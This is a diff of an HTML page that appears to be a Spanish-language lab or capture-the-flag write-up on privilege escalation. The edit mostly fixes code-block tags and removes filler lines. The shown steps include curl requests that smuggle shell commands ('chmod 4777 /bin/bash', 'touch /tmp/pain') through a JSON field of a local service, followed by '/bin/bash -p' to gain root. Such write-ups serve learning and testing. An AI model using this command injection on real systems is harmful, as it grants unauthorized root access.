@@ -253,15 +253,16 @@ chmod +x /tmp/foo
      -H "Content-Type: application/json" \
      -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0MDcyNTg2OCwianRpIjoiOGY1NGE0N2EtZWM4OS00Y2YyLWFkNzAtMTk5NWYzZDdjNjk1IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTc0MDcyNTg2OCwiY3NyZiI6ImVjY2RjYmEwLTBmMzctNGQ0OS05YmMwLTA3ZTczNDI5ZTg4ZiIsImV4cCI6MTc0MDcyOTQ2OH0.SsWgWeA4MwLWvGpk15ofm5pdxpod3ONO50s3JdH1aBQ" \
      -d '{"command":"send_image","output_file":"foo","extra":"touch /tmp/pain"}'
+  </code></pre>
 <h1>ROOT</h1>
 <p> Finalmente, los comandos se están ejecutando y el propietario del archivo es root</p> 
 <p>Cambiar el permiso en /bin/bash para obtener el privilegio de root </p>
-</code></pre>
+<pre><code>
 curl -X POST http://127.0.0.1:9090/command \
      -H "Content-Type: application/json" \
      -H "Authorization: Bearer yJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0MDcyNTg2OCwianRpIjoiOGY1NGE0N2EtZWM4OS00Y2YyLWFkNzAtMTk5NWYzZDdjNjk1IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTc0MDcyNTg2OCwiY3NyZiI6ImVjY2RjYmEwLTBmMzctNGQ0OS05YmMwLTA3ZTczNDI5ZTg4ZiIsImV4cCI6MTc0MDcyOTQ2OH0.SsWgWeA4MwLWvGpk15ofm5pdxpod3ONO50s3JdH1aBQ" \
      -d '{"command":"send_image","output_file":"foo \nchmod 4777 /bin/bash"}'
-
+</code></pre>
 <pre><code>
 ls -la /bin/bash
 /bin/bash -p
@@ -284,29 +285,7 @@ id
 <p>.</p>
 <p>.</p>
 <p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
+
 
 
 </body>
